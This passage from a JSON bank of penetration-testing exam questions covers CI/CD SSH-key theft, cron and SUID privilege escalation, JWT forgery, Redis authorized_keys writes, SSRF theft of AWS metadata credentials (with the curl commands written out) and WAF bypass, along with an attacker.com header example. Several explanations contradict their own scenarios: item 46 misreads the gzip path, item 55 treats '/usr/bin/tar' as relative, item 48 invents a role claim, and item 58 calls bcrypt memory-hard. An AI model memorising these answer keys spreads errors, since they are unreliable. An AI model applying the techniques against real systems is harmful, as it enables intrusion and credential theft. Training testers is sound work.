      "question": "A penetration tester is assessing a CI/CD pipeline and gains access to a Jenkins server. In the system configuration, they find the following pipeline script for deploying to production:\n\n```groovy\npipeline {\n    agent any\n    stages {\n        stage('Deploy to Production') {\n            steps {\n                withCredentials([sshUserPrivateKey(credentialsId: 'deploy-key', keyFileVariable: 'SSH_KEY')]) {\n                    sh '''\n                        export GIT_SSH_COMMAND=\"ssh -i $SSH_KEY -o StrictHostKeyChecking=no\"\n                        git clone git@github.com:company/webapp.git\n                        cd webapp\n                        git checkout master\n                        docker build -t webapp:latest .\n                        docker tag webapp:latest registry.company.com/webapp:latest\n                        docker push registry.company.com/webapp:latest\n                        ssh -i $SSH_KEY -o StrictHostKeyChecking=no deploy@prod-server.company.com \"cd /opt/webapp && docker pull registry.company.com/webapp:latest && docker-compose up -d\"\n                    '''\n                }\n            }\n        }\n    }\n}\n```\n\nWhich attack would be most effective for gaining access to the production environment?",
      "options": [
        "Modify the pipeline to exfiltrate the SSH private key during execution",
        "Manipulate the docker build command to include a backdoor in the image",
        "Exploit the StrictHostKeyChecking=no flag to perform a MITM attack",
        "Inject malicious code into the GitHub repository that will be deployed"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most effective attack would be to modify the pipeline to exfiltrate the SSH private key during execution. The pipeline script uses the withCredentials block to temporarily provide an SSH private key for deployment, storing it in the $SSH_KEY variable. A malicious actor with access to the Jenkins server could modify the pipeline to send this key to an attacker-controlled server, granting persistent access to both the GitHub repository and the production server. This attack provides the most direct and comprehensive access with the least chance of detection. While manipulating the Docker build command could introduce a backdoor, this would be more complex and potentially detected during image scanning or runtime monitoring. Exploiting StrictHostKeyChecking=no for a MITM attack would require being in a network position to intercept SSH traffic, which is less feasible than modifying the pipeline directly. Injecting code into the GitHub repository would require separate access to the repository and might be caught in code reviews or security scans.",
      "examTip": "When assessing CI/CD pipelines, focus on credential handling mechanisms. Pipelines often have access to various sensitive credentials (SSH keys, API tokens, etc.) that are temporarily exposed during execution. An attacker with pipeline modification privileges can add simple exfiltration commands to capture these credentials for persistent access to multiple systems."
    },
    {
      "id": 46,
      "question": "A penetration tester has gained access to a Linux web server and discovers the following cronjob in the system:\n\n```\n# cat /etc/cron.d/log-cleanup\n* * * * * root /usr/local/bin/cleanup-logs.sh\n```\n\nThe tester examines the script:\n\n```bash\n#!/bin/bash\n# Script to clean up old log files\n\nLOG_DIR=\"/var/log/webapp\"\nDELETE_DAYS=30\nARCHIVE_DIR=\"/var/archive/logs\"\n\n# Create archive directory if it doesn't exist\nif [ ! -d \"$ARCHIVE_DIR\" ]; then\n    mkdir -p \"$ARCHIVE_DIR\"\nfi\n\n# Archive logs older than DELETE_DAYS days\nfind \"$LOG_DIR\" -name \"*.log\" -type f -mtime +$DELETE_DAYS -exec sh -c 'DEST=\"$1/${2##*/}\"; cp \"$2\" \"$DEST\" && rm \"$2\"' sh \"$ARCHIVE_DIR\" {} \\;\n\n# Compress any uncompressed archives older than 1 day\nfind \"$ARCHIVE_DIR\" -name \"*.log\" -type f -mtime +1 -exec gzip {} \\;\n\n# Check disk space and alert if running low\nDISK_SPACE=$(df -h $LOG_DIR | grep -v Filesystem | awk '{print $5}' | sed 's/%//')\nif [ $DISK_SPACE -gt 90 ]; then\n    echo \"WARNING: Disk space on $LOG_DIR is critically low: $DISK_SPACE%\" | mail -s \"Low Disk Space Alert\" admin@company.com\nfi\n```\n\nUpon checking the permissions, the tester observes:\n\n```\n# ls -la /usr/local/bin/cleanup-logs.sh\n-rwxr-xr-x 1 root developer 752 Sep 15 10:23 /usr/local/bin/cleanup-logs.sh\n\n# id\nuid=1000(webuser) gid=1000(webuser) groups=1000(webuser),1001(developer)\n```\n\nWhat is the most effective privilege escalation technique in this scenario?",
      "options": [
        "Modify the cleanup-logs.sh script to add a malicious command",
        "Create a malicious executable named 'gzip' in a directory controlled by PATH manipulation",
        "Exploit a command injection vulnerability in the df command output",
        "Create a symbolic link in the log directory to access sensitive files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most effective privilege escalation technique would be modifying the cleanup-logs.sh script directly. The file permissions (-rwxr-xr-x) show that the script is owned by root but is writable by members of the 'developer' group. The output of the 'id' command confirms that the tester's current user (webuser) is a member of the 'developer' group, therefore having write access to the script. The script runs as root (as specified in the cron job), so any modifications to the script will be executed with root privileges every minute. This provides a direct and reliable privilege escalation path. Creating a malicious 'gzip' executable would be less effective because the script uses the absolute path for most commands and does not rely on PATH for the gzip command. There is no evidence of a command injection vulnerability in the df command's output processing. Creating symbolic links in the log directory wouldn't provide privilege escalation as the script doesn't follow symlinks in a way that would grant access to sensitive files.",
      "examTip": "When performing privilege escalation, always check for writable scripts or binaries that are executed by scheduled tasks with elevated privileges. Group-writable scripts owned by root but writable by a group your compromised user belongs to are prime targets, especially when executed frequently by cron jobs."
    },
    {
      "id": 47,
      "question": "A penetration tester is assessing the security of a company's email server and performs a detailed analysis of email headers from several received messages. One suspicious email contains the following headers:\n\n```\nReceived: from mail-gateway.company.com (mail-gateway.company.com [10.0.0.25])\n    by internal-mail.company.com (Postfix) with ESMTP id 1A2B3C4D5E\n    for <ceo@company.com>; Wed, 25 Oct 2023 09:14:22 -0400 (EDT)\nReceived: from suspicious-server.example.net (suspicious-server.example.net [198.51.100.73])\n    by mail-gateway.company.com (Postfix) with ESMTP id F6G7H8I9J0\n    for <ceo@company.com>; Wed, 25 Oct 2023 09:14:20 -0400 (EDT)\nReceived: from internal-mail2.company.com ([10.0.0.27])\n    by suspicious-server.example.net with SMTP id K1L2M3N4O5\n    for <ceo@company.com>; Wed, 25 Oct 2023 09:14:18 -0400\nFrom: \"IT Support\" <support@company.com>\nReply-To: \"External Support\" <support@helpdesk-external.com>\nTo: \"CEO\" <ceo@company.com>\nSubject: Urgent: Security Alert - Action Required\nDate: Wed, 25 Oct 2023 09:14:15 -0400\nMessage-ID: <P6Q7R8S9T0@suspicious-server.example.net>\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"boundary-string\"\n```\n\nWhat email security attack technique does this header analysis reveal?",
      "options": [
        "Email header spoofing with inconsistent Received headers",
        "SMTP server misconfiguration allowing open relay",
        "Man-in-the-middle attack through mail gateway compromise",
        "Domain hijacking through DNS record manipulation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The email headers reveal evidence of email header spoofing with inconsistent Received headers. Several suspicious elements indicate spoofing: 1) The bottom-most 'Received' header claims the message originated from 'internal-mail2.company.com' (an internal server) but was sent through 'suspicious-server.example.net' (an external server), which is logically impossible for legitimate internal mail flow; 2) The chronology is suspicious, with timestamps moving backwards through the receive chain (09:14:15 in the Date header, then progressively later timestamps in each Received header); 3) The From header shows 'support@company.com' (internal) but the Message-ID contains 'suspicious-server.example.net' (external); 4) The Reply-To address diverts replies to an external domain. There's no clear evidence of an open relay misconfiguration, as that would typically show direct delivery from an external source to the internal recipient without proper authentication. A man-in-the-middle attack isn't the most likely explanation, as the headers show standard mail gateway processing. Domain hijacking would typically involve sending from a similar but different domain, not manipulating Received headers.",
      "examTip": "When analyzing email security, carefully examine the chronological flow and logical consistency of Received headers. Legitimate emails should show a consistent path from sender to recipient with timestamps increasing as the email moves toward the recipient. Inconsistencies, especially claims that external servers received mail directly from internal servers, strongly indicate spoofing attempts."
    },
    {
      "id": 48,
      "question": "A penetration tester is examining a web application's authentication mechanism and intercepts the following request and response during login:\n\nRequest:\n```\nPOST /api/auth/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"username\":\"testuser\",\"password\":\"Password123!\"}\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsImV4cCI6MTYzNDY3ODkwMH0.a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; Path=/; HttpOnly\n\n{\"success\":true,\"userId\":1234,\"role\":\"user\"}\n```\n\nAfter successful login, the tester makes a request to access admin functionality:\n\nRequest:\n```\nGET /api/admin/users HTTP/1.1\nHost: example.com\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsImV4cCI6MTYzNDY3ODkwMH0.a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n```\n\nResponse:\n```\nHTTP/1.1 403 Forbidden\nContent-Type: application/json\n\n{\"error\":\"Access denied\",\"message\":\"Insufficient privileges\"}\n```\n\nThe tester modifies the request with a minor change to the JWT token:\n\nRequest:\n```\nGET /api/admin/users HTTP/1.1\nHost: example.com\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYzNDY3ODkwMH0.q9w8e7r6t5y4u3i2o1p0a9s8d7f6g5h4j3k2l1\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"users\":[{\"id\":1,\"username\":\"admin\",...},{\"id\":1234,\"username\":\"testuser\",...},{...}]}\n```\n\nWhat vulnerability has the tester exploited?",
      "options": [
        "JWT token tampering due to weak signature verification",
        "Insufficient authorization checks on the server side",
        "Session fixation allowing privilege escalation",
        "Cross-site request forgery vulnerability in the admin API"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester has exploited a JWT token tampering vulnerability due to weak signature verification. The original JWT token issued by the server contained user information including the user's role, but the tester was able to modify this token to change the role from 'user' to 'admin' and create a new signature that the server accepted as valid. This indicates that the server is not properly validating the token's signature, allowing the tester to forge a valid token with elevated privileges. If proper signature verification were in place, any modification to the token payload would invalidate the signature, resulting in rejection of the tampered token. Insufficient authorization checks would mean the server didn't check roles at all, but the initial 403 response shows it does check for admin role. Session fixation involves forcing a user to use a known session identifier, which isn't demonstrated here. Cross-site request forgery would involve tricking a logged-in user's browser into making unintended requests, which isn't relevant to this scenario where the tester is directly manipulating their own requests.",
      "examTip": "When testing JWT implementations, always attempt to modify the payload claims (especially role or permission claims) and either keep the original signature or compute a new one using various weak signature attacks. Successful acceptance of a modified token indicates a critical implementation flaw in signature verification, often due to using 'none' algorithm, weak keys, or signature validation bypass vulnerabilities."
    },
    {
      "id": 49,
      "question": "A penetration tester is auditing a company's internal network and discovers an unauthenticated Redis server running on a development machine. After connecting to the Redis instance, the tester runs the following commands:\n\n```\n$ redis-cli -h 192.168.1.50\n192.168.1.50:6379> info\n# Server\nredis_version:6.2.6\nos:Linux 5.4.0-89-generic x86_64\n... [truncated] ...\n\n192.168.1.50:6379> config get dir\n1) \"dir\"\n2) \"/var/lib/redis\"\n\n192.168.1.50:6379> config get dbfilename\n1) \"dbfilename\"\n2) \"dump.rdb\"\n\n192.168.1.50:6379> keys *\n1) \"user:admin:password\"\n2) \"app:config\"\n3) \"user:john:password\"\n4) \"user:sarah:password\"\n5) \"api:keys\"\n... [more keys] ...\n\n192.168.1.50:6379> get user:admin:password\n\"$2a$10$eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.K3sicm9sZSI6ImFkbWluIn0=\"\n\n192.168.1.50:6379> get api:keys\n\"{\\\"production\\\":\\\"a1b2c3d4e5f6g7h8i9j0\\\",\\\"development\\\":\\\"dev_k1l2m3n4o5p6q7r8s9t0\\\",\\\"test\\\":\\\"test_u1v2w3x4y5z6a7b8c9d0\\\"}\"\n```\n\nWhich attack technique would be most effective to gain shell access to the host system?",
      "options": [
        "Write an SSH public key to the authorized_keys file through Redis",
        "Create a PHP web shell by writing to the web server directory",
        "Use the extracted API keys to authenticate to other services",
        "Crack the admin password hash to gain administrative access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Writing an SSH public key to the authorized_keys file through Redis would be the most effective technique to gain shell access to the host system. The unauthenticated Redis server allows configuration changes via the 'config set' command, which can be used to change the data directory ('dir') and database filename ('dbfilename') to the SSH directory path and authorized_keys filename respectively. By writing an attacker-controlled SSH key as Redis data and triggering a save operation, the attacker can create or modify the authorized_keys file, enabling SSH access to the system. This technique provides direct shell access with the privileges of the Redis user. Creating a PHP web shell would require knowledge of web server directories and would only work if PHP is installed and configured to execute files in a writable directory. Using the extracted API keys might provide access to other services but doesn't directly grant shell access to the current host. The admin password appears to be stored as a bcrypt hash (indicated by the $2a$ prefix), which would be time-consuming to crack and might not provide immediate system access even if successful.",
      "examTip": "When encountering unauthenticated Redis servers, the SSH authorized_keys attack is a reliable privilege escalation technique. It requires the Redis service account to have write access to its home directory, which is common in default installations. Remember the basic sequence: change the Redis directory to the .ssh folder, set the database filename to authorized_keys, write your public key to a Redis key, and save the database."
    },
    {
      "id": 50,
      "question": "A penetration tester is assessing a company's network security and runs the following nmap scan against an internal server:\n\n```\n$ nmap -sV -p- 192.168.1.100\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-10-22 14:28 EDT\nNmap scan report for 192.168.1.100\nHost is up (0.034s latency).\nNot shown: 65528 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))\n443/tcp  open  ssl/https   Apache httpd 2.4.41 ((Ubuntu))\n3306/tcp open  mysql       MySQL 8.0.27-0ubuntu0.20.04.1\n5432/tcp open  postgresql  PostgreSQL DB 12.9 (Ubuntu 12.9-0ubuntu0.20.04.1)\n6379/tcp open  redis       Redis key-value store 6.0.16\n8983/tcp open  http        Apache Solr 8.11.1\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host) up, scanned in 42.53 seconds\n```\n\nBased on the scan results, which service should the tester prioritize for vulnerability testing?",
      "options": [
        "Apache Solr on port 8983",
        "Redis on port 6379",
        "MySQL on port 3306",
        "Apache HTTP on port 80"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester should prioritize Apache Solr on port 8983 for vulnerability testing. Among the discovered services, Apache Solr 8.11.1 stands out for several reasons: 1) Solr is a complex search platform with a history of critical vulnerabilities; 2) The specific version 8.11.1 is relatively recent but may still contain known vulnerabilities; 3) Search platforms like Solr often have extensive attack surfaces through their query interfaces and administrative APIs; 4) Solr instances are frequently misconfigured, allowing unauthorized access to administrative interfaces. While Redis (6379) can also be vulnerable to unauthorized access, it's less common to find exploitable vulnerabilities in recent Redis versions. MySQL (3306) and PostgreSQL (5432) typically require credentials for access, limiting initial attack vectors. The Apache HTTP server (80/443) is generally well-hardened in its default configuration compared to more specialized services like Solr.",
      "examTip": "When prioritizing services for vulnerability testing, focus on complex application services (like search platforms, content management systems, or middleware) over standard infrastructure services. These specialized applications often have larger attack surfaces, more complex configurations, and are updated less frequently than core services like web servers or databases."
    },
    {
      "id": 51,
      "question": "A penetration tester identifies an AWS EC2 instance with SSRF vulnerability. After exploiting it, they get the following response by accessing http://169.254.169.254/latest/meta-data/iam/security-credentials/:\n\n```\nrole-name-qa-testing\n```\n\nWhat command should the tester execute next to advance their access?",
      "options": [
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-qa-testing",
        "aws sts get-caller-identity --profile role-name-qa-testing",
        "aws s3 ls --profile role-name-qa-testing",
        "curl http://169.254.169.254/latest/user-data/iam/security-credentials/role-name-qa-testing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester should use curl to request the actual credentials for the discovered role. The initial response only provides the role name, not the credentials themselves. The command 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name-qa-testing' would retrieve the actual credentials (access key, secret key, token) for the identified role. The 'aws sts get-caller-identity' command would require AWS CLI and credentials to be already configured. The 'aws s3 ls' command attempts to list S3 buckets but also requires configured credentials. The last option uses an incorrect metadata path with 'user-data' which isn't where IAM credentials are stored in the metadata service.",
      "examTip": "When exploiting SSRF against AWS instances, remember the two-step process: first retrieve the role name from the metadata service, then use that exact role name to request the actual credentials."
    },
    {
      "id": 52,
      "question": "During a web application penetration test, you discover a host header injection vulnerability. Examine the following request and response:\n\nRequest:\n```\nGET / HTTP/1.1\nHost: vulnerable-app.com\nX-Forwarded-Host: attacker.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\n```\n\nResponse (snippet):\n```\n<html>\n<head>\n<link rel=\"stylesheet\" href=\"https://attacker.com/styles.css\">\n</head>\n```\n\nWhat specific attack can be performed using this vulnerability?",
      "options": [
        "Cache poisoning leading to persistent cross-site scripting attacks",
        "Password reset poisoning by manipulating email link generation",
        "HTTP request smuggling through inconsistent header parsing",
        "Web cache deception by forcing caching of sensitive content"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The vulnerability shown is a host header injection where the application accepts the X-Forwarded-Host header and uses it to generate URLs in the response. This vulnerability is particularly dangerous in password reset functionality, where the application generates reset links based on the hostname. An attacker could trigger a password reset for a victim, manipulate the host header to point to their controlled domain, and when the victim receives the reset email with the manipulated link, it would direct them to the attacker's site where their reset token could be captured. Cache poisoning typically requires the ability to permanently store the manipulated response in a shared cache. HTTP request smuggling requires specific conditions related to front-end and back-end server disagreement on request parsing. Web cache deception involves tricking a cache into storing sensitive information, which isn't demonstrated in this vulnerability.",
      "examTip": "Host header injection vulnerabilities often appear benign (like CSS loading in this example) but can be devastating when exploited in critical flows like password resets where the application generates external links."
    },
    {
      "id": 53,
      "question": "A penetration tester is analyzing security around a containerized application. They discover a deployment manifest with the following configuration:\n\n```yaml\nsecurityContext:\n  privileged: false\n  capabilities:\n    add: [\"NET_ADMIN\", \"SYS_PTRACE\"]\n```\n\nWhat security implication does this configuration present?",
      "options": [
        "The container can modify network configurations and debug processes, potentially leading to container escape",
        "The container has full root-equivalent access to the host due to the combined capabilities",
        "The privileged:false setting negates the added capabilities, creating a false sense of security",
        "This configuration allows the container to modify other containers' network settings but not the host's"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This configuration grants the container two specific Linux capabilities: NET_ADMIN allows manipulation of network interfaces and firewall rules, while SYS_PTRACE enables process tracing and debugging. Together, these capabilities don't provide full root access (which privileged:true would), but they do present significant security implications. The NET_ADMIN capability could allow network traffic interception, while SYS_PTRACE could be used to attach to and debug processes, potentially leading to information disclosure or container escape through kernel vulnerabilities. The privileged:false setting doesn't negate specific capabilities; it just doesn't grant all capabilities automatically. The configuration doesn't necessarily allow modifying other containers' settings directly, though network manipulation could affect communication.",
      "examTip": "When assessing container security, always inspect specific capability grants even when 'privileged: false' is set. Certain combinations of individual capabilities can still enable sophisticated attack paths."
    },
    {
      "id": 54,
      "question": "A penetration tester finds an outdated web application firewall with the following rule configuration:\n\n```\nSecRule REQUEST_COOKIES_NAMES \"@rx ^(|cookie1|cookie2|JSESSIONID|session|auth|token)$\" \"id:1,phase:1,deny,log,msg:'Invalid cookie name'\"\nSecRule REQUEST_METHOD \"!@rx ^(GET|POST)$\" \"id:2,phase:1,deny,log,msg:'Invalid HTTP method'\"\nSecRule REQUEST_URI \"@rx (\\.\\./)\" \"id:3,phase:1,deny,log,msg:'Directory traversal attempt'\"\n```\n\nWhich technique would bypass this WAF configuration?",
      "options": [
        "Sending a PUT request with URL encoded directory traversal payload %2e%2e%5c",
        "Using a custom cookie named 'authorization' containing a SQL injection payload",
        "Submitting a GET request with path traversal in base64-encoded parameters",
        "Executing a POST request with JSON-formatted content containing an XSS payload"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The WAF rule 'SecRule REQUEST_COOKIES_NAMES' specifically matches only the listed cookie names (cookie1, cookie2, JSESSIONID, session, auth, token), blocking them if they match the regex. Any other cookie name like 'authorization' would bypass this rule. The WAF also blocks non-GET/POST methods and simple directory traversal attempts with '../', but doesn't restrict cookie names beyond those listed or inspect cookie values at all. The PUT method with encoded traversal would be blocked by rule 2 (invalid HTTP method). The encoded traversal in a GET request might bypass rule 3 if not normalized, but is riskier than the cookie bypass. A POST with JSON XSS payload would be allowed by rule 2 but likely caught by other rules not shown if the WAF inspects request bodies.",
      "examTip": "When analyzing WAF rules, look for exact pattern matching specifications that might be overly restrictive or exclusive. Many WAFs fail when attackers use variations not explicitly defined in rules, such as slightly different names for cookies or headers."
    },
    {
      "id": 55,
      "question": "A penetration tester has gained access to a Linux system and discovers the SUID bit set on an unusual binary. Analyze the following command output:\n\n```bash\n$ ls -la /usr/local/bin/backup_manager\n-rwsr-xr-x 1 root root 18272 Jan 12 2023 /usr/local/bin/backup_manager\n\n$ strings /usr/local/bin/backup_manager | grep -i system\nusing system command to create archive\nsystem(\"/usr/bin/tar -czvf /tmp/backup.tar.gz /var/www\");\nfailed to execute system command\n```\n\nHow should the tester leverage this binary to gain elevated privileges?",
      "options": [
        "Create a malicious tar binary in a directory controlled by PATH manipulation",
        "Exploit a race condition in the /tmp/backup.tar.gz file creation",
        "Use input validation flaws to inject additional commands in the backup path",
        "Replace the strings binary to manipulate the command output"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The binary shows it's executing the tar command without using a full path ('/usr/bin/tar' rather than just 'tar'), but the strings output reveals it's using the system() C function which relies on the PATH environment variable to locate binaries. This creates a PATH hijacking opportunity. The tester should create a malicious 'tar' executable in a directory they control, then manipulate the PATH environment variable to prioritize their directory before /usr/bin. When executed, the SUID backup_manager will run the malicious tar binary with root privileges. Race condition exploitation would require write access to /tmp/backup.tar.gz before it's created, which isn't indicated. There's no evidence of input validation flaws allowing command injection. Replacing the strings binary wouldn't affect actual execution of backup_manager.",
      "examTip": "When examining SUID binaries, always check for relative path command execution through system() calls. Many SUID exploits involve PATH manipulation rather than buffer overflows or direct code exploitation."
    },
    {
      "id": 56,
      "question": "A penetration tester is assessing an ASP.NET application and discovers it uses Forms Authentication. The tester intercepts the following cookie after login:\n\n```\n.ASPXAUTH=33FB5A0615F945E083A3E3F6D7B51A7650F86147AC1844A7CD4C1342DB8AB5D1734134161C804A85DA2D6C52F9F060D8AC4\n```\n\nWhich attack technique should be applied to analyze this cookie?",
      "options": [
        "Padding oracle attack against the encrypted authentication ticket",
        "JWT token brute force signature verification bypass",
        "Session prediction attack through cookie value analysis",
        "Cross-site scripting through cookie manipulation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The .ASPXAUTH cookie format indicates this is an ASP.NET Forms Authentication ticket. These tickets are typically encrypted and signed using AES in CBC mode with PKCS#7 padding. Older versions of ASP.NET (prior to security patches) were vulnerable to padding oracle attacks, where an attacker could iteratively modify the encrypted cookie and observe application responses to eventually decrypt or forge valid authentication tickets without knowing the key. JWT tokens have a different structure with header, payload, and signature components separated by periods. Session prediction would apply to predictable session generation algorithms, not relevant to encrypted authentication tickets. XSS through cookie manipulation would require the cookie to be reflected in the page content, which isn't typical for authentication cookies.",
      "examTip": "When testing authentication mechanisms, identify the specific technology in use first (.ASPXAUTH indicating ASP.NET Forms Authentication), then apply the appropriate specialized techniques such as padding oracle attacks for encrypted cookies."
    },
    {
      "id": 57,
      "question": "A penetration tester is examining Windows permissions during a post-exploitation phase and runs the following commands:\n\n```powershell\nPS C:\\> Get-Acl -Path \"C:\\Program Files\\Service\\config.xml\" | Format-List\n\nPath   : Microsoft.PowerShell.Core\\FileSystem::C:\\Program Files\\Service\\config.xml\nOwner  : BUILTIN\\Administrators\nGroup  : NT AUTHORITY\\SYSTEM\nAccess : BUILTIN\\Users Allow  Modify, Synchronize\n         NT AUTHORITY\\SYSTEM Allow  FullControl\n         BUILTIN\\Administrators Allow  FullControl\n```\n\nThe tester also discovers this registry entry:\n\n```\nPS C:\\> Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Service\"\n\nName      : Service\nImagePath : C:\\Program Files\\Service\\service.exe\nObjectName: LocalSystem\nStart     : 2\n```\n\nWhat privilege escalation opportunity exists here?",
      "options": [
        "Modify the config.xml file to include a DLL hijacking directive that will be loaded by the service",
        "Use the Users group Modify permission to edit the service binary directly",
        "Manipulate the registry Start value to prevent the service from launching properly",
        "Change the ObjectName value in the registry to a compromised user account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The output shows that regular users (BUILTIN\\Users) have Modify permissions on the config.xml file in the service directory while the service itself runs as SYSTEM (LocalSystem). This creates a privilege escalation opportunity if the service reads configuration from this file. A penetration tester could modify the configuration to include a DLL hijacking directive or command execution, which would be processed by the service when it next starts, executing with SYSTEM privileges. Regular users cannot modify the service binary itself as it's in Program Files which has restricted permissions. The registry entry shown is under HKLM which typically requires administrative privileges to modify, so changing Start or ObjectName values would require privileges the tester doesn't yet have. Additionally, those changes would be more easily detected and less reliable than modifying a configuration file.",
      "examTip": "During privilege escalation hunting, focus on permission misconfigurations in files used by high-privilege services. Writable configuration files often provide a more reliable escalation path than attempting to modify service binaries or registry entries directly."
    },
    {
      "id": 58,
      "question": "A penetration tester has gained access to a database and is extracting password hashes for offline cracking. They find the following hash types:\n\n1. `$1$G5tFVFHs$8pKgJYG/cI8Aoz8lnuMqX/`\n2. `$2a$10$K/kB6KR.2w1JjTU5Ry1yi.PwABsVcGYtQTDcZxgHTWk0N2YxEXnQS`\n3. `$6$rounds=5000$usesalt$RbYn0Mrn8Nh9wBqKwH.ZJn93joXYCFZcjObCZba.F.cRekUfO3iBnLclpuVUkKaQnu/Xq6MSFEcxfgGVpOlY/0`\n4. `$apr1$g1Qo7n9W$HiNzwmKXJpnCIEZUCI0Il/`\n\nWhich hash type will require significantly more computational resources to crack?",
      "options": [
        "Hash #2 (bcrypt with cost factor 10)",
        "Hash #3 (SHA-512crypt with 5000 rounds)",
        "Hash #1 (MD5crypt)",
        "Hash #4 (Apache MD5)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hash #2 is a bcrypt hash (identified by the $2a$ prefix) with a cost factor of 10. Bcrypt is specifically designed to be computationally expensive to resist brute force attacks, and it has a cost factor that exponentially increases the work required to compute each hash. Hash #3 is SHA-512crypt with 5000 rounds (as indicated by $6$rounds=5000$), which is stronger than MD5-based algorithms but less computationally intensive than bcrypt with cost factor 10 for a single hash computation. Hash #1 is MD5crypt (indicated by $1$), which is relatively weak by modern standards. Hash #4 is Apache MD5 (indicated by $apr1$), which is similar to MD5crypt in security strength but used specifically by Apache for htpasswd files. The bcrypt algorithm uses the Blowfish cipher in a way that requires significant memory and CPU resources, making it orders of magnitude slower to crack than the other hash types listed.",
      "examTip": "When prioritizing password cracking attempts, focus first on older hash algorithms like MD5crypt ($1$) and Apache MD5 ($apr1$) which can be cracked much more efficiently than memory-hard algorithms like bcrypt ($2a$) with higher cost factors."
    },
    {
      "id": 59,
      "question": "While running Docker security scanning on a container image, a penetration tester receives the following output:\n\n```\nVULNERABILITY SEVERITY PACKAGE VERSION FIX VERSION\nCVE-2021-3711 HIGH openssl 1.1.1f-1ubuntu2.5 1.1.1f-1ubuntu2.16\nCVE-2021-4034 CRITICAL policykit-1 0.105-26ubuntu1 0.105-26ubuntu1.1\nCVE-2022-0778 MEDIUM openssl 1.1.1f-1ubuntu2.5 1.1.1f-1ubuntu2.14\nCVE-2022-2068 HIGH openssl 1.1.1f-1ubuntu2.5 1.1.1f-1ubuntu2.15\n```\n\nBased on this scan report, what is the correct approach to verify the exploitability of the critical vulnerability?",
      "options": [
        "Execute a specialized PolKit exploit within the container targeting pkexec with a crafted environment",
        "Attempt to crash the container by sending malformed certificates to the OpenSSL implementation",
        "Test for OpenSSL padding oracle vulnerabilities using automated exploitation frameworks",
        "Check if the container is running as root using docker inspect and confirm PolicyKit installation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The critical vulnerability CVE-2021-4034 affects policykit-1 (PolicyKit) and is commonly known as PwnKit. This vulnerability allows local privilege escalation through the pkexec utility by manipulating environment variables. To verify exploitability, the tester would need to execute a specialized exploit targeting pkexec with a crafted environment within the container. The OpenSSL vulnerabilities (CVE-2021-3711, CVE-2022-0778, CVE-2022-2068) are concerning but rated High or Medium, not Critical. Testing OpenSSL with malformed certificates would potentially verify CVE-2022-0778 (the infinite loop DoS vulnerability) but not the critical vulnerability. OpenSSL padding oracle attacks aren't relevant to the listed CVEs. While checking if the container runs as root is a good general security practice, it doesn't specifically verify the exploitability of the PolicyKit vulnerability, which can work even in containers with limited privileges if pkexec is available and setuid root.",
      "examTip": "When prioritizing vulnerability verification during penetration testing, focus first on critical-rated vulnerabilities with known exploit paths. For local privilege escalation vulnerabilities like PwnKit (CVE-2021-4034), verify if the vulnerable component is installed and accessible before attempting actual exploitation."
    },
    {
      "id": 60,
      "question": "A penetration tester has access to a low-privileged shell on a Linux server and observes that multiple users connect to it. The tester runs the following commands:\n\n```bash\n$ ps aux | grep ssh\nroot      1234  0.0  0.1  72296  5532 ?        Ss   10:04   0:00 /usr/sbin/sshd -D\nsysadmin  2345  0.0  0.2  99120  9872 ?        S    13:15   0:00 sshd: sysadmin@pts/0\ndbadmin   3456  0.0  0.2  99120  9872 ?        S    14:21   0:00 sshd: dbadmin@pts/1\n\n$ cat /etc/ssh/sshd_config | grep -v \"^#\" | grep -v \"^$\"\nPort 22\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nHostKey /etc/ssh/ssh_host_dsa_key\nPermitRootLogin yes\nPasswordAuthentication yes\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n$ uname -a\nLinux server01 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nWhat attack technique would be most effective for credential harvesting in this environment?",
      "options": [
        "Compile and install a kernel exploit for 4.15.0-99 to install a kernel-level keylogger",
        "Add a backdoored PAM module to capture authentication credentials",
        "Replace the SSH binary with a modified version that logs credentials",
